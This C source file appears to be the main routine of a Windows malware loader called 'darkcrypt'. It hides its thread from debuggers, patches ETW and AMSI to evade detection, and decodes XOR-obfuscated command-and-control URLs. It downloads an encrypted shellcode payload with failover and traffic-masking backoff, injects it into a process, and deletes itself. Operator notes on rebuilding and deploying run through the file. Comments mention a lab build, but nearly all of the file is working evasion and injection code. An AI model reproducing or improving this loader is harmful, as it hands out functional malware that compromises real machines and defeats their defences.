/*
 * aes-main.c — darkcrypt orchestrator (fully hardened)
 *
 * F3:  AES decryption via Windows CNG (no S-box in binary).
 * F8:  HMAC-SHA256 tag verification before decrypt.
 * F9:  AES + MAC keys DERIVED per-machine (HKDF-SHA256 of MachineGuid +
 *      volume serial + embedded salt). No static key in the binary. Payload
 *      format (R7): magic(4) || version(2) || IV(16) || ciphertext || HMAC(32).
 *      Operator encrypts per-target. HMAC-SHA256 itself is computed via CNG
 *      (cng_hmac.c) — no SHA-256 constants in the binary (R2). The salt is a
 *      single source (keyderive_derive_from_fingerprint, R4); under
 *      DARKCRYPT_BUILD_ID the BUILD_ID is mixed into the salt (R8).
 * F11: Multi-C2 failover — an array of XOR-encoded URLs; each is tried with
 *      a jittered exponential backoff (R3: count-derived gaps removed) until
 *      one yields a valid (HMAC-verified) payload.
 * F18: All sensitive strings use multi-byte rolling-key XOR (xor_dec_mb).
 * F20: antidebug_hide_thread() runs BEFORE antidebug_check() so the thread is
 *      hidden from the start; re-applied after checks as belt-and-braces.
 * All debug output guarded by #if DEBUG.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cng.h"
#include "hmac.h"
#include "http.h"
#include "inject.h"
#include "obfuscation.h"
#include "antidebug.h"
#include "etw.h"
#include "halos.h"
#include "peb.h"

/* F22: per-build randomization. Only included when the release-random
 * target passes -DDARKCRYPT_BUILD_ID (which generates build_id.h first). */
#ifdef DARKCRYPT_BUILD_ID
#include "build_id.h"
#endif

/* ---- F11: multi-C2 URL table (multi-byte rolling-key XOR) ----
 * Each entry: its own random key + encoded "https://host:port/path".
 * Operator: add entries via `python3 tools/xor_encode.py --mb-key-random N "<url>"`.
 * R5 (HTTPS pivot): now points at the TLS endpoint :9443; http.c flips to
 * WINHTTP_FLAG_SECURE via URL-scheme auto-detect and sets SECURITY_FLAG_*
 * ignore flags for the lab's self-signed cert.
 * "https://<C2>:9443/aes.encrypted" MB-XOR key_len=6 (42 chars) */
static const uint8_t _enc_key_url0[6]   = { 0xc7, 0x63, 0xaf, 0xcb, 0x6c, 0x00 };
static const uint8_t _enc_url0[42]      = {
    0xaf, 0x17, 0xdb, 0xbb, 0x1f, 0x3a, 0xe8, 0x4c, 0x9e, 0xf2, 0x5e, 0x2e,
    0xf6, 0x55, 0x97, 0xe5, 0x5d, 0x32, 0xf5, 0x4d, 0x9e, 0xf8, 0x5d, 0x3a,
    0xfe, 0x57, 0x9b, 0xf8, 0x43, 0x61, 0xa2, 0x10, 0x81, 0xae, 0x02, 0x63,
    0xb5, 0x1a, 0xdf, 0xbf, 0x09, 0x64
};
#define NUM_C2_URLS 1   /* bump when adding more _enc_urlN / _enc_key_urlN */

/* ---- R7: payload magic + version header ----
 * The encoded file is now: magic(4) || version(2) || IV(16) || ciphertext ||
 * HMAC(32). The 6-byte header lets the loader distinguish a truncated/tampered
 * payload from a wrong-file-entirely before it ever reaches the HMAC check,
 * and gives us a version field for future format changes. Magic = "DCP1"
 * (darkcrypt payload, version 1). */
#define DC_PAYLOAD_MAGIC0  'D'
#define DC_PAYLOAD_MAGIC1  'C'
#define DC_PAYLOAD_MAGIC2  'P'
#define DC_PAYLOAD_VERSION 1
#define DC_PAYLOAD_HDR_LEN 6   /* magic(4) + version(2) */

/* ---- kernel32 function-pointer typedefs ---- */
typedef DWORD (WINAPI *GetTickCount_t)(void);
typedef void  (WINAPI *Sleep_t)(DWORD);
typedef void  (WINAPI *ExitProcess_t)(UINT);

/* F13: self-deletion via CreateFileA(FILE_FLAG_DELETE_ON_CLOSE). */
static void self_delete(void)
{
    FARPROC pGetModName = peb_resolve_kernel32(HASH_GetModuleFileNameA);
    if (!pGetModName) return;
    typedef DWORD (WINAPI *GetModuleFileNameA_t2)(HMODULE, LPSTR, DWORD);
    char path[MAX_PATH];
    DWORD n = ((GetModuleFileNameA_t2)pGetModName)(NULL, path, sizeof(path));
    if (!n || n >= sizeof(path)) return;

    FARPROC pCreateFile = peb_resolve_kernel32(HASH_CreateFileA);
    if (pCreateFile) {
        typedef HANDLE (WINAPI *CreateFileA_t)(LPCSTR, DWORD, DWORD,
            LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
        HANDLE h = ((CreateFileA_t)pCreateFile)(
            path, DELETE, FILE_SHARE_READ, NULL, 3 /* OPEN_EXISTING */,
            0x04000000 /* FILE_FLAG_DELETE_ON_CLOSE */, NULL);
        if (h && h != INVALID_HANDLE_VALUE) return;  /* OS deletes on exit */
    }
    FARPROC pMoveFile = peb_resolve_kernel32(HASH_MoveFileExA);
    if (pMoveFile) {
        typedef BOOL (WINAPI *MoveFileExA_t)(LPCSTR, LPCSTR, DWORD);
        ((MoveFileExA_t)pMoveFile)(path, NULL, 0x4);
    }
}
int main(void)
{
#if DEBUG
    setbuf(stdout, NULL);
#endif
    DBG_PRINTF("[main] start\n");
    /* V4: reference camouflage padding to prevent --gc-sections from removing it. */
    extern void *camouflage_get_pad(void);
    volatile void *_pad_keep = camouflage_get_pad();
    (void)_pad_keep;

    /* === 0. Persistent syscall trampoline (F4/F15) === */
    DBG_PRINTF("[main] calling halos_init\n");
    halos_init();
    DBG_PRINTF("[main] halos_init returned\n");

    /* VM lab build: initial timing-evasion sleep removed.
     * pGetTick/pSleep are still resolved — used downstream by the C2 retry
     * backoff. */
    FARPROC pGetTick = peb_resolve_kernel32(HASH_GetTickCount);
    FARPROC pSleep   = peb_resolve_kernel32(HASH_Sleep);

    /* VM lab build: hide thread only; skip the 9-check anti-debug gate
     * (one of its checks is a CPUID hypervisor probe that fires inside KVM). */
    antidebug_hide_thread();

    /* === ETW + AMSI bypass (HWBP-based, 24H2-safe) ===
     * Inline byte-patch variant was crashing under 24H2 CFG / dynamic-code
     * mitigation. The HWBP variant in etw.c sets DR0/DR1 on this thread and
     * installs a shared VEH that returns a clean verdict without executing
     * the real hook. Patches are per-thread (loader thread only); patching
     * the injected process requires a separate remote-DR primitive. */
    DBG_PRINTF("[main] etw_patch (HWBP) ...\n");
    etw_patch();
    DBG_PRINTF("[main] amsi_patch (HWBP) ...\n");
    amsi_patch();
    DBG_PRINTF("[main] amsi_selftest (EICAR) ...\n");
    amsi_selftest();

    /* VM lab build: anti-sandbox checks removed (running inside a controlled VM). */
    DBG_PRINTF("[+] Pre-flight checks skipped (VM lab build)\n");

    /* === Static baked keys (per-build) ===
     * Operator workflow: ./encode2aes-linux <shellcode.bin> prints both arrays;
     * paste them over the placeholders below, rebuild, deploy. aes.encrypted is
     * a per-encryption random IV + ciphertext + HMAC — the IV is read from the
     * payload, so only AES_KEY + AES_MAC_KEY need to live here. */
    static const uint8_t aes_key[32] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    static const uint8_t mac_key[32] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    DBG_PRINTF("[+] Static AES + MAC keys loaded\n");

    /* === 5+11. Download + multi-C2 failover ===
     * Try each URL in the table; the first one whose payload passes the
     * HMAC check wins. A jittered exponential backoff between attempts (R3). */
    uint8_t *enc_payload = NULL;
    size_t   enc_len     = 0;
    char url_buf[256];

    /* URL decode tables (per entry) */
    static const uint8_t *const url_keys[NUM_C2_URLS] = {
        _enc_key_url0,
    };
    static const uint8_t *const url_data[NUM_C2_URLS] = {
        _enc_url0,
    };
    static const int url_key_lens[NUM_C2_URLS] = { 6 };
    static const int url_lens[NUM_C2_URLS]      = { 42 };

    int got = 0;
    for (int i = 0; i < NUM_C2_URLS && !got; i++) {
        xor_dec_mb(url_buf, url_data[i], url_lens[i],
                   url_keys[i], url_key_lens[i]);
        DBG_PRINTF("[*] Trying C2 #%d\n", i);
        if (!http_download(url_buf, &enc_payload, &enc_len)) {
            DBG_PRINTF("[-] C2 #%d download failed\n", i);
            /* R3: jittered exponential backoff. The old `2000 + (i*1000)` was a
             * linear, count-derived delay — a network observer seeing N attempts
             * with linearly-increasing gaps could infer the total number of
             * configured C2s (operational fingerprinting). Use a randomized
             * exponential schedule instead: base 2s + up to 4s jitter, doubled
             * per attempt, so the gaps reveal nothing about the table size. */
            if (pSleep) {
                DWORD seed = pGetTick ? ((GetTickCount_t)pGetTick)() : 0;
                DWORD jitter = seed % 4000;
                DWORD base = 2000 + jitter;
                /* shift left by i, capped so we don't overflow / sleep forever */
                DWORD shift = (i < 8) ? i : 8;
                DWORD delay = base << shift;
                ((Sleep_t)pSleep)(delay);
            }
            secure_zero(url_buf, sizeof(url_buf));
            continue;
        }
        DBG_PRINTF("[+] Downloaded %zu bytes from C2 #%d\n", enc_len, i);
        secure_zero(url_buf, sizeof(url_buf));

        /* R7 payload format: magic(4) || version(2) || IV(16) || ciphertext ||
         * HMAC(32). Minimum: 6 header + 16 IV + 16 (1 AES block) + 32 HMAC = 70. */
        if (enc_len < 70) {
            DBG_PRINTF("[-] Payload too short (%zu bytes, need >= 70)\n", enc_len);
            secure_zero(enc_payload, enc_len); free(enc_payload);
            enc_payload = NULL; continue;
        }
        /* R7: verify the magic + version before trusting anything. A wrong
         * magic means this isn't a darkcrypt payload (wrong file / sinkhole
         * served garbage); a wrong version means an encoder/loader mismatch.
         * Both are rejected with a clear diagnostic instead of a cryptic
         * "HMAC failed" downstream. */
        if (enc_payload[0] != DC_PAYLOAD_MAGIC0 ||
            enc_payload[1] != DC_PAYLOAD_MAGIC1 ||
            enc_payload[2] != DC_PAYLOAD_MAGIC2 ||
            enc_payload[3] != ('0' + DC_PAYLOAD_VERSION)) {
            DBG_PRINTF("[-] Bad payload magic (not a DCP1 payload)\n");
            secure_zero(enc_payload, enc_len); free(enc_payload);
            enc_payload = NULL; continue;
        }
        uint16_t ver = (uint16_t)((enc_payload[4] | (enc_payload[5] << 8)));
        if (ver != DC_PAYLOAD_VERSION) {
            DBG_PRINTF("[-] Payload version %u != loader version %u\n",
                       ver, DC_PAYLOAD_VERSION);
            secure_zero(enc_payload, enc_len); free(enc_payload);
            enc_payload = NULL; continue;
        }
        got = 1;
    }
    if (!got) {
        DBG_PRINTF("[-] All C2 endpoints exhausted\n");
        return 1;
    }

    /* === F8/F9/R7: split header + IV + ciphertext + HMAC tag, verify ===
     * Format: magic(4) || version(2) || IV(16) || ciphertext || HMAC(32).
     * The 6-byte header was already validated in the fetch loop. */
    uint8_t aes_iv[16];
    memcpy(aes_iv, enc_payload + DC_PAYLOAD_HDR_LEN, 16);
    size_t  cipher_len = enc_len - DC_PAYLOAD_HDR_LEN - 16 - 32;
    uint8_t file_tag[32];
    memcpy(file_tag, enc_payload + DC_PAYLOAD_HDR_LEN + 16 + cipher_len, 32);

    uint8_t computed_tag[32];
    hmac_sha256(mac_key, 32, enc_payload + DC_PAYLOAD_HDR_LEN + 16,
                cipher_len, computed_tag);
    if (hmac_verify(file_tag, computed_tag) != 0) {
        DBG_PRINTF("[-] HMAC failed — tampered\n");
        secure_zero(enc_payload, enc_len); free(enc_payload);
        return 1;
    }
    DBG_PRINTF("[+] HMAC verified\n");
    secure_zero(computed_tag, sizeof(computed_tag));

    /* === F3: Decrypt via CNG (IV from payload, key derived) === */
    size_t   plain_len = 0;
    uint8_t *payload = cng_decrypt(aes_key, aes_iv,
                                  enc_payload + DC_PAYLOAD_HDR_LEN + 16,
                                  cipher_len, &plain_len);
    secure_zero(aes_iv, sizeof(aes_iv));
    secure_zero(enc_payload, enc_len); free(enc_payload);
    if (!payload) { DBG_PRINTF("[-] Decrypt failed\n"); return 1; }
    DBG_PRINTF("[+] Decrypted %zu bytes\n", plain_len);

    /* === 7. Inject === */
    BOOL ok = inject_shellcode(payload, plain_len);
    DBG_PRINTF("[%c] Injection %s\n", ok ? '+' : '-', ok ? "OK" : "FAILED");

    /* === 8. Memory hygiene === */
    secure_zero(payload, plain_len); free(payload);

    /* === 9. Self-deletion (F13) === */
    self_delete();
    return ok ? 0 : 1;
}